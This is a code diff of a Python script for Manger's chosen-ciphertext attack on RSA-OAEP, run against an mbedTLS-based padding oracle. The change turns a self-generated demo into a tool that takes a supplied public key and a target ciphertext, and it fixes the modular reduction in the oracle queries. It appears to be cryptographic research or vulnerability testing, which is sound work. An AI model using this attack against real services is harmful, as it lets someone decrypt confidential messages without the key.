@@ -4,7 +4,7 @@ https://www.iacr.org/archive/crypto2001/21390229.pdf
 """
 from oracles import Oracle_MbedTLS
 from Crypto.Cipher import PKCS1_OAEP
-from Crypto.PublicKey import RSA
+from attack_args import parse_args, read_pubkey
 
 
 def divceil(a, b):
@@ -41,7 +41,7 @@ def find_f1(k, key, c, oracle):
     :return: f1 such that B/2 <= f1 * m / 2 < B
     """
     f1 = 2
-    while oracle.query((pow(f1, key.e, key.n) * c).to_bytes(int.bit_length(key.n), byteorder='big')):
+    while oracle.query(((pow(f1, key.e, key.n) * c) % key.n).to_bytes(k, byteorder='big')):
         f1 *= 2
     return f1
 
@@ -60,7 +60,7 @@ def find_f2(k, key, c, f1, oracle):
     """
     B = 2 ** (8 * (k - 1))
     f2 = divfloor(key.n + B, B) * (f1 // 2)
-    while not oracle.query((pow(f2, key.e, key.n) * c).to_bytes(int.bit_length(key.n), byteorder='big')):
+    while not oracle.query(((pow(f2, key.e, key.n) * c) % key.n).to_bytes(k, byteorder='big')):
         f2 += f1 // 2
     return f2
 
@@ -88,7 +88,7 @@ def find_m(k, key, c, f2, oracle, verbose=False):
         i = divfloor(f_tmp * m_min, key.n)
         f3 = divceil(i * key.n, m_min)
 
-        if oracle.query((pow(f3, key.e, key.n) * c).to_bytes(int.bit_length(key.n), byteorder='big')):
+        if oracle.query(((pow(f3, key.e, key.n) * c) % key.n).to_bytes(k, byteorder='big')):
             m_max = divfloor(i * key.n + B, f3)
         else:
             m_min = divceil(i * key.n + B, f3)
@@ -126,17 +126,20 @@ def manger_attack(k, key, c, oracle, verbose=False):
 
 
 if __name__ == "__main__":
-    n_length = 1024
+    args = parse_args()
 
-    key = RSA.generate(n_length)
-    pub_key = key.public_key()
-    k = int(n_length / 8)
+    k = int(args.n_length / 8)
 
-    oracle = Oracle_MbedTLS()
+    oracle = Oracle_MbedTLS(port=args.start_port)
 
-    cipher = PKCS1_OAEP.new(key)
-    message = b'secret message'
-    c = cipher.encrypt(message)
+    with open(args.public_key, "rb") as keyfile:
+        pub_key = read_pubkey(keyfile, k)
+
+    if args.given_enc is not None:
+        with open(args.given_enc, "rb") as f:
+            c = f.read()
+    else:
+        raise Exception("Attack requires a valid ciphertext (pass --given-enc)")
 
     result = manger_attack(k, pub_key, c, oracle, True)
     print(result)
